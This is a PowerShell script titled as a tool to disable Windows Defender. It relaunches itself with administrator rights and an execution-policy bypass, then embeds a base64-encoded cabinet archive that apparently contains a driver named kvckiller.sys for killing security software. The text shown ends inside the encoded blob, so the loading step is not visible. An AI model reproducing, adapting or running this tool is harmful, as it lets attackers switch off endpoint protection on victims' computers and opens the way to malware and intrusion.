#DISABLE DEFENDER SCRIPT BY ZOIC
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
  Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
  Exit	
}


$DriverCabB64 = @'
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
